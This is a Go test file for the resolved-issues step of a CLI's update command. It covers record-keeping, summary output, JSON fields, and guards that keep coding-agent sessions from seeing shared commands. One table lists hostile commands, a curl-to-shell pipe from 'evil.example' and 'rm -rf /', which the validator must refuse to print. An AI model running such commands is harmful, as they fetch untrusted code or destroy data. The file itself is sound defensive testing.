package cli

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"github.com/spf13/cobra"

	"github.com/dimipaun/fugaro/internal/blobx"
	"github.com/dimipaun/fugaro/internal/initflow"
	"github.com/dimipaun/fugaro/internal/installrec"
	"github.com/dimipaun/fugaro/internal/issueresolve"
	"github.com/dimipaun/fugaro/internal/issues"
	"github.com/dimipaun/fugaro/internal/localcfg"
	"github.com/dimipaun/fugaro/internal/updatecheck"
)

// update_resolved_test.go drives the resolved-issues step of `fugaro update`
// (T-RU5, update_resolved.go): the record it advances, the pass it runs and the
// summary it prints. GitHub is answered by a reader of the test's own and the
// shared store is a bucket under t.TempDir(), so nothing here reaches a
// network, a home directory or a cloud.
//
// Most of these tests call initRun.updateResolved directly — the one call site
// inside a run — because what a step does for one mode is the step's guard and
// not the converge's cost. The two that are the door itself are
// TestUpdateAtPreviousVersionConverges, and the failed apply the excluded-modes
// test builds.

// resolvedPrint is the fingerprint of the second issue in these tests. The
// shared store keys an issue by its fingerprint (F21), so two records that
// carry one fingerprint are one issue and would take one number: a test that
// wants two rows needs two fingerprints.
var resolvedPrint = strings.Repeat("cd", 32)

// resolvedIssueURL is the link one record is filed as: the shape the store
// accepts and the one the pass builds its question from, whose number is the
// GitHub issue and not the record's own (F28).
func resolvedIssueURL(number int) string {
	return "https://github.com/" + updatecheck.Repo + "/issues/" + strconv.Itoa(number)
}

// resolvedBucket is a runs bucket this test owns — the handle it files issues
// through and reads the store back with — and the directory behind it, which
// retryBucketFiles and the record's own path are read from.
func resolvedBucket(t *testing.T) (*blobx.Bucket, string) {
	t.Helper()
	dir := t.TempDir()
	return resolvedStore(t, dir), dir
}

// resolvedStore opens one handle on a bucket directory. The step closes the
// bucket its own seam answered with, so what that seam answers has to be a
// handle of its own and not the one the test is still reading the store with.
func resolvedStore(t *testing.T, dir string) *blobx.Bucket {
	t.Helper()
	b, err := blobx.Open(t.Context(), "file://"+dir)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = b.Close() })
	return b
}

// resolvedFiled is one issue of the project, filed on GitHub as the number in
// its link: the record a teammate's machine uploaded and named, which is the
// state the pass asks GitHub about.
func resolvedFiled(t *testing.T, b *blobx.Bucket, number int, fingerprint, summary, command string) issues.Uploaded {
	t.Helper()
	i := retrySharedIssue(retryRun, "")
	i.Fingerprint = fingerprint
	i.Summary = summary
	if command != "" {
		i.FailedCommand = command
	}
	up, err := uploadAsReporter(t.Context(), b, i)
	if err != nil {
		t.Fatalf("filing issue %d: %v", number, err)
	}
	c, err := issues.Claim(t.Context(), b, up.Number, retryRun, retryAt)
	if err != nil {
		t.Fatalf("claiming issue %d: %v", up.Number, err)
	}
	if err := issues.RecordSubmitted(t.Context(), b, c, resolvedIssueURL(number), retryAt); err != nil {
		t.Fatalf("filing issue %d: %v", up.Number, err)
	}
	return up
}

// resolvedReader answers for GitHub: the states a test names, and open — no
// verdict — for every issue it does not.
type resolvedReader map[int]issueresolve.State

func (r resolvedReader) Fetch(_ context.Context, number int) (issueresolve.State, error) {
	if s, ok := r[number]; ok {
		return s, nil
	}
	return issueresolve.Open{}, nil
}

// resolvedBroken is a reader that cannot reach GitHub at all.
type resolvedBroken struct{}

func (resolvedBroken) Fetch(context.Context, int) (issueresolve.State, error) {
	return issueresolve.NoVerdict{}, fmt.Errorf("%w: no route to host", issueresolve.ErrTransport)
}

// resolvedUntouched is the reader of a step that may not reach GitHub at all —
// a run that left a step for the person, a run on the other door: one Fetch is
// the step spending the pass's twenty seconds and its twenty requests (F17), so
// a call here is a failure and not an answer.
type resolvedUntouched struct{ t *testing.T }

func (r resolvedUntouched) Fetch(context.Context, int) (issueresolve.State, error) {
	r.t.Error("the resolved-issues step asked GitHub about an issue in a run that may not run the pass")
	return issueresolve.NoVerdict{}, errors.New("the step may not reach GitHub here")
}

// stubUpdateResolve replaces the pass's own wiring, as digestResolveDeps does
// for the report: the store, the cursor and the session's marker are the run's
// own and only the reader is the test's.
func stubUpdateResolve(t *testing.T, reader issues.Reader) {
	t.Helper()
	old := updateResolveDeps
	updateResolveDeps = func(cmd *cobra.Command, b *blobx.Bucket) issues.ResolveDeps {
		d := old(cmd, b)
		d.Reader = reader
		return d
	}
	t.Cleanup(func() { updateResolveDeps = old })
}

// resolvedNoStdin is the run's own input: anything that reads it fails the
// test. The step may not read stdin (F7), and this is how that is measured.
type resolvedNoStdin struct{ t *testing.T }

func (r resolvedNoStdin) Read([]byte) (int, error) {
	r.t.Error("the resolved-issues step read the run's stdin")
	return 0, io.EOF
}

// resolvedRig is the step on the door that has it, `fugaro update`: the door's
// own command — so the tree a stored command is checked against is the released
// one — and the run the door builds.
func resolvedRig(t *testing.T, modes func(*initOptions), dir string) (*initRun, *bytes.Buffer) {
	t.Helper()
	return resolvedDoorRig(t, newUpdateCmdWith, modes, dir)
}

// resolvedDoorRig is resolvedRig over a door of the caller's choosing. Both
// doors build their run through newInitCmdWith (setup.go, update.go) and both
// reach the resolved-issues step — init_stages.go's outcome is the loop's and
// not one door's — so which door a run is is part of what the step has to
// answer, and a test that drives the other one drives it the same way.
//
// dir "" installs no bucket seam, for the modes that may not open one at all.
// modes is applied after the command is built, because building it writes every
// flag's default into the options (pflag's own constructors do): a mode a test
// drives has to be set after the door exists, exactly as a parser would set it,
// and before newInitRun reads --json.
func resolvedDoorRig(t *testing.T, door func(*initOptions) *cobra.Command, modes func(*initOptions), dir string) (*initRun, *bytes.Buffer) {
	t.Helper()
	o := &initOptions{}
	cmd := door(o)
	root := NewRootCmd()
	root.AddCommand(cmd)
	var out bytes.Buffer
	root.SetOut(&out)
	root.SetErr(&out)
	cmd.SetOut(&out)
	cmd.SetErr(&out)
	cmd.SetIn(resolvedNoStdin{t})
	cmd.SetContext(t.Context())
	if modes != nil {
		modes(o)
	}
	if dir != "" {
		stubRetryBucket(t, func(context.Context, cloudOptions, retryProject) (*blobx.Bucket, error) {
			return resolvedStore(t, dir), nil
		})
	}
	return newInitRun(cmd, o), &out
}

// stubResolvedBucketFatal is the bucket a run that may not touch the store
// would open — one that applied nothing, or one that left a step for the
// person — and the step failing here is the assertion.
func stubResolvedBucketFatal(t *testing.T) {
	t.Helper()
	stubRetryBucket(t, func(context.Context, cloudOptions, retryProject) (*blobx.Bucket, error) {
		t.Error("the step opened the runs bucket for a run that may not touch the store")
		return nil, errors.New("no bucket")
	})
}

// resolvedRecord is the installation record the bucket holds.
func resolvedRecord(t *testing.T, b *blobx.Bucket) installrec.Record {
	t.Helper()
	rec, err := installrec.Read(t.Context(), b)
	if err != nil {
		t.Fatal(err)
	}
	return rec
}

// resolvedRunsBucket is the runs bucket the fixture's `fugaro update` converged
// against, read from the project config the run selected (the retry tests' own
// route to it: the bucket URL is the config's, and this rig's is a file:// one).
func resolvedRunsBucket(t *testing.T) *blobx.Bucket {
	t.Helper()
	lc, err := localcfg.Load(filepath.Join(os.Getenv("XDG_CONFIG_HOME"), "fugaro", "projects", initProjectName+".yaml"))
	if err != nil {
		t.Fatal(err)
	}
	b, err := blobx.Open(t.Context(), lc.BucketURL())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = b.Close() })
	return b
}

// TestUpdatePrintsResolvedSummaryAndHitBy: after a run that installed a release
// the update records the two releases it spans and prints what this one fixes
// (spec steps 4 and 5): the summary line, who hit each issue, and — this
// machine's own record being the source of the command — the line that offers
// to try it again.
func TestUpdatePrintsResolvedSummaryAndHitBy(t *testing.T) {
	retryEnv(t)
	b, dir := resolvedBucket(t)
	up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
	retryFile(t, retryStore(t), up.Number, "fugaro update")
	stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: retryRelease}})

	r, out := resolvedRig(t, nil, dir)
	r.updateResolved(t.Context())

	want := fmt.Sprintf("This update fixes 1 of your project's issues: #%04d (the update stopped half way).\n"+
		"#%04d: hit by ana\n"+
		"#%04d is fixed. The command that failed was 'fugaro update'. You may want to try it again. It may change things.\n",
		up.Number, up.Number, up.Number)
	if out.String() != want {
		t.Errorf("the update printed:\n%s\nwant:\n%s", out.String(), want)
	}
	if rec := resolvedRecord(t, b); rec.Release != retryRelease {
		t.Errorf("the record says the update spanned up to %q, want %q", rec.Release, retryRelease)
	}
	// The local file is marked, because the line was printed for it: the retry
	// offer that follows the step says the same thing about the same issue and
	// must not say it twice (update_retry.go).
	got, err := retryStore(t).Get(strconv.Itoa(up.Number))
	if err != nil {
		t.Fatal(err)
	}
	if !got.Notified {
		t.Error("the summary printed this machine's own command without marking the issue as offered")
	}
}

// TestUpdateResolvedUsesLocalCommandElseShared: the command a fixed issue's
// line names is this machine's own file's when it has one — that text is what
// the person actually ran — and the shared record's otherwise (D1755, F28).
func TestUpdateResolvedUsesLocalCommandElseShared(t *testing.T) {
	retryEnv(t)
	b, dir := resolvedBucket(t)
	own := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "fugaro issue mine")
	mate := resolvedFiled(t, b, 1235, resolvedPrint, "the report came out empty", "fugaro issue mine")
	retryFile(t, retryStore(t), own.Number, "fugaro update")
	stubUpdateResolve(t, resolvedReader{
		1234: issueresolve.ClosedCompleted{Milestone: retryRelease},
		1235: issueresolve.ClosedCompleted{Milestone: retryRelease},
	})

	r, out := resolvedRig(t, nil, dir)
	r.updateResolved(t.Context())

	if want := fmt.Sprintf("#%04d is fixed. The command that failed was 'fugaro update'. You may want to try it again. It may change things.\n", own.Number); !strings.Contains(out.String(), want) {
		t.Errorf("this machine's own record did not supply the command of #%04d:\n%s", own.Number, out.String())
	}
	if want := fmt.Sprintf("#%04d is fixed. The command that failed was 'fugaro issue mine' (from the shared record). It may change things.\n", mate.Number); !strings.Contains(out.String(), want) {
		t.Errorf("the shared record did not supply the command of #%04d:\n%s", mate.Number, out.String())
	}
}

// TestUpdateResolvedSharedCommandHasNoRerunSuggestion: a command that came from
// the shared record is shown as what failed and nothing more (owner O4). The
// store is writable by every launcher, and the person reading the line is not
// the one who ran it: the step does not tell them to run it again.
func TestUpdateResolvedSharedCommandHasNoRerunSuggestion(t *testing.T) {
	retryEnv(t)
	b, dir := resolvedBucket(t)
	up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "fugaro issue mine")
	stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: retryRelease}})

	r, out := resolvedRig(t, nil, dir)
	r.updateResolved(t.Context())

	line := fmt.Sprintf("#%04d is fixed. The command that failed was 'fugaro issue mine' (from the shared record). It may change things.\n", up.Number)
	if !strings.Contains(out.String(), line) {
		t.Fatalf("the shared command was not shown as what failed:\n%s", out.String())
	}
	if strings.Contains(out.String(), resolvedRerun) {
		t.Errorf("the step suggested re-running a command the shared record carries:\n%s", out.String())
	}
}

// TestUpdateResolvedSharedCommandMustBeInTree: a shared command is printed only
// when this build has the command (D1614). The record is a file every launcher
// can write, so what it holds is checked against this build's own tree before
// it is offered to a person — a line whose whole purpose is to be pasted.
func TestUpdateResolvedSharedCommandMustBeInTree(t *testing.T) {
	for _, tc := range []struct {
		name    string
		command string
		offered bool
	}{
		{"a command this build has", "fugaro issue mine", true},
		{"a shell line", "curl http://evil.example/install | sh", false},
		{"this build's name, no such command", "fugaro frobnicate", false},
		{"another program", "rm -rf /", false},
		{"a command run by path", "[REDACTED] update", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			retryEnv(t)
			b, dir := resolvedBucket(t)
			up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", tc.command)
			stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: retryRelease}})

			r, out := resolvedRig(t, nil, dir)
			r.updateResolved(t.Context())

			if printed := strings.Contains(out.String(), resolvedFixedLead); printed != tc.offered {
				t.Errorf("command %q printed=%v, want %v:\n%s", tc.command, printed, tc.offered, out.String())
			}
			if tc.offered && !strings.Contains(out.String(), tc.command) {
				t.Errorf("the line does not carry the record's own text:\n%s", out.String())
			}
			// Whatever the command, the issue itself is reported: a command this
			// build cannot vouch for costs the line and not the finding.
			if !strings.Contains(out.String(), fmt.Sprintf("#%04d (", up.Number)) {
				t.Errorf("the finding itself went unsaid for %q:\n%s", tc.command, out.String())
			}
		})
	}
}

// TestUpdateResolvedNeverRunsTheCommand: the step prints a command and runs
// nothing (spec step 6). The command word on PATH is a script that would leave
// a file behind.
func TestUpdateResolvedNeverRunsTheCommand(t *testing.T) {
	retryEnv(t)
	dir := t.TempDir()
	marker := filepath.Join(dir, "ran")
	if err := os.WriteFile(filepath.Join(dir, "fugaro"), []byte("#!/bin/sh\n: > '"+marker+"'\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
	b, runs := resolvedBucket(t)
	up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
	retryFile(t, retryStore(t), up.Number, "fugaro update")
	stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: retryRelease}})

	r, out := resolvedRig(t, nil, runs)
	r.updateResolved(t.Context())

	if !strings.Contains(out.String(), resolvedFixedLead) {
		t.Fatalf("the step printed no command, so this test proves nothing:\n%s", out.String())
	}
	if _, err := os.Stat(marker); err == nil {
		t.Error("the step ran the command it printed")
	}
}

// TestUpdateResolvedPlanOnlyRunsNothing: --plan-only applied nothing, so it has
// no release to record and no window to list (F17). The store is not touched at
// all — the step returns before it opens the bucket.
func TestUpdateResolvedPlanOnlyRunsNothing(t *testing.T) {
	retryEnv(t)
	stubResolvedBucketFatal(t)

	r, out := resolvedRig(t, func(o *initOptions) { o.planOnly = true }, "")
	r.updateResolved(t.Context())

	if out.String() != "" {
		t.Errorf("--plan-only printed:\n%s", out.String())
	}
	if r.res.ResolvedIssues != nil {
		t.Errorf("--plan-only put %+v in the --json document", r.res.ResolvedIssues)
	}
}

// TestUpdateResolvedIncompleteRunWritesNothing: a run that did not finish
// resolves nothing either. What the step does is not an offer to ignore — it
// advances the installation record and writes the shared store — and it would
// do both from a run whose own result says it stopped short of the state the
// release belongs to: the steps a run cannot finish without a person (a
// secret's value, a policy publish that would loosen the published node) are
// listed under left_for_you, the run exits 1 over them, and it is the run the
// person then makes that installed the release.
//
// The fact is the one `outcome` records from the loop before this step runs
// (r.res.LeftForYou = res.Left), so the fixture sets it there — the same fact
// and the same shape the sibling step's guard is pinned with
// (TestAdminListUnconfirmedRunWritesNothing, update_adminlist_test.go). A run
// that reaches the bucket seam, the pass or the store at all is what this
// fails on: the seam is fatal, the reader fails on its first question, and the
// step answers with neither a line nor a document field.
func TestUpdateResolvedIncompleteRunWritesNothing(t *testing.T) {
	retryEnv(t)
	stubResolvedBucketFatal(t)
	stubUpdateResolve(t, resolvedUntouched{t})

	r, out := resolvedRig(t, nil, "")
	r.res.LeftForYou = []initflow.Left{{
		Stage: initflow.Secrets, Kind: initflow.LeftCommand, Text: selfCommand() + " secrets set acme/app API_KEY",
	}}
	r.updateResolved(t.Context())

	if out.String() != "" {
		t.Errorf("a run that left a step for the person printed:\n%s", out.String())
	}
	if r.res.ResolvedIssues != nil {
		t.Errorf("a run that left a step for the person put %+v in the --json document", r.res.ResolvedIssues)
	}
}

// TestUpdateResolvedSetupDoorRunsNothing: the step is the update door's and no
// other's (F17). Both doors run the converge it hangs off — outcome is the
// loop's and not one door's, so a setup run reaches the same call site — and a
// setup run installed nothing: the record it would advance is the
// installation's, which the update door applied, and the pass it would run is
// about the issues a release fixed. A setup run that reached either would
// spend its own run on another door's bookkeeping, against a store it did not
// converge.
func TestUpdateResolvedSetupDoorRunsNothing(t *testing.T) {
	retryEnv(t)
	stubResolvedBucketFatal(t)
	stubUpdateResolve(t, resolvedUntouched{t})

	r, out := resolvedDoorRig(t, newSetupCmdWith, nil, "")
	r.updateResolved(t.Context())

	if out.String() != "" {
		t.Errorf("a setup run printed:\n%s", out.String())
	}
	if r.res.ResolvedIssues != nil {
		t.Errorf("a setup run put %+v in the --json document", r.res.ResolvedIssues)
	}
}

// TestSetupDoorResolvesNothing is the same guard through the whole command: a
// `fugaro setup --yes` run converges and reaches neither of the step's seams.
// Both are fatal here, so the run's own success and its silence about issues
// are what say the step answered before it opened the bucket and before it
// asked GitHub anything — and that the door is what stopped it, rather than a
// mode, a project the run could not select or a store that happened to be
// empty.
func TestSetupDoorResolvesNothing(t *testing.T) {
	newInitRig(t)
	stubResolvedBucketFatal(t)
	stubUpdateResolve(t, resolvedUntouched{t})

	out, _, err := executeStdin(t, "", "setup", "--yes")
	if err != nil {
		t.Fatalf("fugaro setup stopped at %s:\n%s", stoppedStage(out), out)
	}
	if strings.Contains(out, resolvedSummaryLead) || strings.Contains(out, resolvedAlsoHead) {
		t.Errorf("a setup run printed the resolved issues:\n%s", out)
	}
}

// TestUpdateResolvedAgentSessionWritesNothing: a coding agent's session prints
// the findings and writes nothing (F16d). The installation record is a cloud
// write and the shared store's rows are the person's, so both are left exactly
// as they are and the session's reader still sees the same lines.
func TestUpdateResolvedAgentSessionWritesNothing(t *testing.T) {
	retryEnv(t)
	b, dir := resolvedBucket(t)
	up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
	retryFile(t, retryStore(t), up.Number, "fugaro update")
	stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: retryRelease}})
	t.Setenv(agentMarkers[0], "1")
	before := retryBucketFiles(t, dir)

	r, out := resolvedRig(t, nil, dir)
	r.updateResolved(t.Context())

	if !strings.Contains(out.String(), resolvedSummaryLead) {
		t.Errorf("an agent's session did not print the findings:\n%s", out.String())
	}
	if after := retryBucketFiles(t, dir); len(after) != len(before) {
		t.Errorf("an agent's session wrote to the shared store: %d object(s) before, %d after", len(before), len(after))
	}
	if _, err := os.Stat(filepath.Join(dir, filepath.FromSlash(installrec.Object))); err == nil {
		t.Error("an agent's session advanced the installation record")
	}
	rows, err := issues.ListShared(t.Context(), b)
	if err != nil {
		t.Fatal(err)
	}
	for _, row := range rows {
		if row.Status != issues.StatusSubmitted {
			t.Errorf("an agent's session moved issue #%04d to %q", row.Number, row.Status)
		}
	}
}

// TestUpdateResolvedGitHubUnreachableIsQuiet: the update succeeds and prints
// nothing about issues when GitHub cannot be reached (spec, Acceptance). The
// record still advances — it is what the two releases were, and no answer from
// GitHub is part of it.
func TestUpdateResolvedGitHubUnreachableIsQuiet(t *testing.T) {
	retryEnv(t)
	b, dir := resolvedBucket(t)
	up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
	retryFile(t, retryStore(t), up.Number, "fugaro update")
	stubUpdateResolve(t, resolvedBroken{})

	r, out := resolvedRig(t, nil, dir)
	r.updateResolved(t.Context())

	if out.String() != "" {
		t.Errorf("an unreachable GitHub printed:\n%s", out.String())
	}
	if rec := resolvedRecord(t, b); rec.Release != retryRelease {
		t.Errorf("the record says the update spanned up to %q, want %q", rec.Release, retryRelease)
	}
}

// TestUpdateResolvedSharedStoreUnreadableIsQuiet: a store this machine cannot
// open is a line not printed and an update that stands (the hard rule). Nothing
// about the step may fail a run.
func TestUpdateResolvedSharedStoreUnreadableIsQuiet(t *testing.T) {
	retryEnv(t)
	stubRetryBucket(t, func(context.Context, cloudOptions, retryProject) (*blobx.Bucket, error) {
		return nil, errors.New("the project's runs bucket is unreachable")
	})

	r, out := resolvedRig(t, nil, "")
	r.updateResolved(t.Context())

	if out.String() != "" {
		t.Errorf("an unreadable store printed:\n%s", out.String())
	}
	if r.res.ResolvedIssues != nil {
		t.Errorf("an unreadable store put %+v in the --json document", r.res.ResolvedIssues)
	}
}

// TestUpdateResolvedJSONHasAdditiveField: the step's findings reach the console,
// the mobile app and the history through `resolved_issues`, an additive field of
// the document they already read. A run that fixes nothing carries none of it,
// so a reader that never heard of the field reads the same bytes it always did.
func TestUpdateResolvedJSONHasAdditiveField(t *testing.T) {
	retryEnv(t)
	b, dir := resolvedBucket(t)
	up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
	stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: retryRelease}})

	r, _ := resolvedRig(t, func(o *initOptions) { o.asJSON = true }, dir)
	r.updateResolved(t.Context())
	if len(r.res.ResolvedIssues) != 1 {
		t.Fatalf("the document carries %+v, want the one fixed issue", r.res.ResolvedIssues)
	}
	data, err := json.Marshal(r.res)
	if err != nil {
		t.Fatal(err)
	}
	var doc struct {
		Resolved []struct {
			Number  int      `json:"number"`
			Summary string   `json:"summary"`
			Release string   `json:"release"`
			URL     string   `json:"url"`
			HitBy   []string `json:"hit_by"`
		} `json:"resolved_issues"`
	}
	if err := json.Unmarshal(data, &doc); err != nil {
		t.Fatalf("resolved_issues: %v\n%s", err, data)
	}
	if len(doc.Resolved) != 1 {
		t.Fatalf("resolved_issues holds %+v, want one entry", doc.Resolved)
	}
	got := doc.Resolved[0]
	switch {
	case got.Number != up.Number:
		t.Errorf("resolved_issues[0].number = %d, want %d", got.Number, up.Number)
	case got.Summary != "the update stopped half way":
		t.Errorf("resolved_issues[0].summary = %q", got.Summary)
	case got.Release != retryRelease:
		t.Errorf("resolved_issues[0].release = %q, want %q", got.Release, retryRelease)
	case got.URL != resolvedIssueURL(1234):
		t.Errorf("resolved_issues[0].url = %q, want the issue's link", got.URL)
	case len(got.HitBy) != 1 || got.HitBy[0] != "ana":
		t.Errorf("resolved_issues[0].hit_by = %v, want the reporter's local part", got.HitBy)
	}

	// An update that fixes nothing: the field is not in the document at all.
	_, quiet := resolvedBucket(t)
	empty, _ := resolvedRig(t, func(o *initOptions) { o.asJSON = true }, quiet)
	empty.updateResolved(t.Context())
	data, err = json.Marshal(empty.res)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), "resolved_issues") {
		t.Errorf("a run that fixed nothing carries the field:\n%s", data)
	}
}

// TestUpdateResolvedNonInteractiveReadsNoStdin: the step never reads stdin,
// under a run that answers nothing by itself as much as under any other (F7):
// an update that stopped to read a question would be an update that waits.
func TestUpdateResolvedNonInteractiveReadsNoStdin(t *testing.T) {
	retryEnv(t)
	b, dir := resolvedBucket(t)
	up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
	stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: retryRelease}})

	// The rig's own stdin is a reader that fails the test when it is read.
	r, out := resolvedRig(t, func(o *initOptions) { o.nonInteractive, o.yes = true, true }, dir)
	r.updateResolved(t.Context())

	if !strings.Contains(out.String(), fmt.Sprintf("#%04d is fixed.", up.Number)) {
		t.Errorf("--non-interactive --yes printed no findings:\n%s", out.String())
	}
}

// TestUpdateDoesNotAdvanceRecordInExcludedModes: the record is written by the
// run that applied this release and by no other (F17). One subtest per mode
// that applies nothing, and three the run's own state decides: a failed apply
// (the door, in full), a coding agent's session (whose writes are the person's)
// and a dev build (which is not a release).
//
// The agent subtest is the mutation check the plan names: remove the
// agent-marker guard around Advance in update_resolved.go and it fails, because
// the record appears in the store the session may not write.
func TestUpdateDoesNotAdvanceRecordInExcludedModes(t *testing.T) {
	for _, tc := range []struct {
		mode string
		set  func(*initOptions)
	}{
		{"--plan-only", func(o *initOptions) { o.planOnly = true }},
		{"--print-vars", func(o *initOptions) { o.printVars = true }},
		{"--non-interactive without --yes", func(o *initOptions) { o.nonInteractive = true }},
		{"--forget", func(o *initOptions) { o.forget = true }},
		{"--config-only", func(o *initOptions) { o.configOnly = true }},
		{"--publish-config", func(o *initOptions) { o.publishConfig = true }},
		{"--anchor", func(o *initOptions) { o.anchor = true }},
		{"--repo", func(o *initOptions) { o.repo = true }},
	} {
		t.Run(tc.mode, func(t *testing.T) {
			retryEnv(t)
			// The bucket the step would advance the record in: opening it here
			// is the failure.
			stubResolvedBucketFatal(t)

			r, out := resolvedRig(t, tc.set, "")
			r.updateResolved(t.Context())
			if out.String() != "" {
				t.Errorf("%s printed:\n%s", tc.mode, out.String())
			}
		})
	}

	t.Run("a failed apply", func(t *testing.T) {
		r := newConvergeRig(t, v6Node())
		currentRelease(t)
		// The installation's plan fails, so the run has no success to hang a
		// step off at all (init_stages.go's outcome returns before the hooks).
		r.script["plan"] = map[string]any{"exit": 1, "stderr": "Error: quota exceeded\n"}
		r.save(t)
		if _, _, err := executeStdin(t, "", "update", "--yes"); err == nil {
			t.Fatal("the plan failed, yet the update succeeded")
		}
		if _, _, err := resolvedRunsBucket(t).ReadMax(t.Context(), installrec.Object, 4<<10); err == nil {
			t.Errorf("a failed update wrote %s", installrec.Object)
		}
	})

	t.Run("an agent session", func(t *testing.T) {
		retryEnv(t)
		b, dir := resolvedBucket(t)
		resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
		stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: retryRelease}})
		t.Setenv(agentMarkers[0], "1")

		r, _ := resolvedRig(t, nil, dir)
		r.updateResolved(t.Context())
		if _, err := os.Stat(filepath.Join(dir, filepath.FromSlash(installrec.Object))); err == nil {
			t.Error("an agent's session wrote the installation record")
		}
	})

	t.Run("a dev build", func(t *testing.T) {
		retryEnv(t)
		withVersion(t, "dev")
		b, dir := resolvedBucket(t)
		resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
		stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: retryRelease}})

		r, out := resolvedRig(t, nil, dir)
		r.updateResolved(t.Context())
		if out.String() != "" {
			t.Errorf("a dev build printed:\n%s", out.String())
		}
		if _, err := os.Stat(filepath.Join(dir, filepath.FromSlash(installrec.Object))); err == nil {
			t.Error("a dev build wrote the installation record")
		}
	})
}

// TestUpdateSummaryIncludesRecordsAnotherMachineResolved: a teammate's update
// already marked an issue resolved in this window, so this run never sees it as
// `submitted` (F18). The record is what decides which fixes a person is told
// about, so the second machine to update prints the first one's list rather
// than nothing.
func TestUpdateSummaryIncludesRecordsAnotherMachineResolved(t *testing.T) {
	retryEnv(t)
	withVersion(t, convergeRelease)
	b, dir := resolvedBucket(t)
	// An installation that has updated twice with a build that writes the
	// record: the window is the last span, (1.2.2, 1.2.3].
	for _, v := range []string{"1.2.1", convergePrev} {
		if _, err := installrec.Advance(t.Context(), b, v); err != nil {
			t.Fatal(err)
		}
	}
	up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "")
	if err := issues.SetResolved(t.Context(), b, up.Number, convergeRelease, 0, retryAt); err != nil {
		t.Fatalf("a teammate's pass marking issue %d: %v", up.Number, err)
	}
	// This run's own pass asks GitHub about the issues still submitted — none —
	// so the row can only come from the store's own resolved records.
	stubUpdateResolve(t, resolvedReader{})

	r, out := resolvedRig(t, nil, dir)
	r.updateResolved(t.Context())

	want := fmt.Sprintf("This update fixes 1 of your project's issues: #%04d (the update stopped half way).\n", up.Number)
	if !strings.Contains(out.String(), want) {
		t.Errorf("this update did not print the fix another machine recorded:\n%s", out.String())
	}
	if rec := resolvedRecord(t, b); rec.Release != convergeRelease || rec.PreviousRelease != convergePrev {
		t.Errorf("the record spans %q..%q, want %q..%q", rec.PreviousRelease, rec.Release, convergePrev, convergeRelease)
	}
}

// TestUpdateAgentSessionPrintsNoSharedCommand: a command from the shared record
// is not shown in a coding agent's session (F16d). A session's output is read by
// an agent, and a launcher's command line in it is a command an agent may take
// as an instruction. The find itself is printed: it is this machine's own file
// that carries a command in a session, and that one is the person's own words
// (T-IS19's offer prints the same line under the same rule).
func TestUpdateAgentSessionPrintsNoSharedCommand(t *testing.T) {
	retryEnv(t)
	b, dir := resolvedBucket(t)
	up := resolvedFiled(t, b, 1234, retryFingerprint, "the update stopped half way", "fugaro issue mine")
	stubUpdateResolve(t, resolvedReader{1234: issueresolve.ClosedCompleted{Milestone: retryRelease}})
	t.Setenv(agentMarkers[0], "1")

	r, out := resolvedRig(t, nil, dir)
	r.updateResolved(t.Context())
	if !strings.Contains(out.String(), fmt.Sprintf("#%04d (", up.Number)) {
		t.Fatalf("the session printed no finding, so this test proves nothing:\n%s", out.String())
	}
	if strings.Contains(out.String(), resolvedFixedLead) {
		t.Errorf("a coding agent's session was shown the shared record's command:\n%s", out.String())
	}

	// The same store in a person's own session, so the silence above is the
	// session's and not a step that never names a shared command.
	t.Setenv(agentMarkers[0], "")
	person, out := resolvedRig(t, nil, dir)
	person.updateResolved(t.Context())
	if !strings.Contains(out.String(), "(from the shared record)") {
		t.Errorf("a person's own update was not shown the shared record's command:\n%s", out.String())
	}
}

// TestUpdateAtPreviousVersionConverges: an installation at the previous release
// with no installation record and no issues store at all — the normal state of
// the first update after this feature — converges with `fugaro update` alone and
// leaves the record that says which two releases it spanned.
func TestUpdateAtPreviousVersionConverges(t *testing.T) {
	newConvergeRig(t, v6Node())
	currentRelease(t)

	out, errOut, err := executeStdin(t, "", "update", "--yes")
	if err != nil {
		t.Fatalf("fugaro update stopped at %s (exit %d), so this installation needs a second command:\n%s\n%s",
			stoppedStage(out), ExitCode(err), out, errOut)
	}
	rec := resolvedRecord(t, resolvedRunsBucket(t))
	if rec.Release != convergeRelease {
		t.Errorf("the record says the update spanned up to %q, want %q", rec.Release, convergeRelease)
	}
	if rec.PreviousRelease != "" {
		t.Errorf("the first record an installation writes names %q as the release before it, want none", rec.PreviousRelease)
	}
}

// TestUpdateResolvedWindowIsTheRecordedSpan: the window the summary's list is
// read against is (X, Y] — Y this build's release, X the recorded release when
// that is below Y and the recorded previous_release when it is not (F17, D1754,
// D1757). Both halves are one line of updateResolvedWindow and the whole list
// hangs off the difference: taking previous_release for X widens an ordinary
